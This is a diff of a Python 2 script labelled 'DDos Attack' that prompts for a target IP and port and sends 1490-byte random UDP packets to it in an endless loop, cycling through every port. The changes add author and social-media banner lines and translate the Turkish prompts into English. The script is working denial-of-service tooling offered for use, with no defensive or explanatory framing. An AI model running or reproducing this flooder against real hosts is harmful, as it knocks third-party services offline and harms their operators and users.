@@ -15,15 +15,18 @@ year = now.year
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
-##############
+#############
 
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print print "İnstagram : https://www.instagram.com/karanlik.online"
+print "Author   : karanlik.onlinee"
+print "You Tube : https://www.youtube.com/c/karanlik.onlinee"
+print "github   : https://github.com/karanlikonlinee"
+print "instagram : https://www.instagram.com/karanlik.onlinee"
 print
-ip = input("Hedef IP : ")
-port = input("Port : ")
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
@@ -42,6 +45,6 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Saldiri %s başlatıldi %s Gönderilen Paket:%s"%(sent,ip,port)
+     print "Saldırı %s Başlatıldı %s Gönderilen Paket:%s"%(sent,ip,port)
      if port == 65534:
-     port = 1
+       port = 1
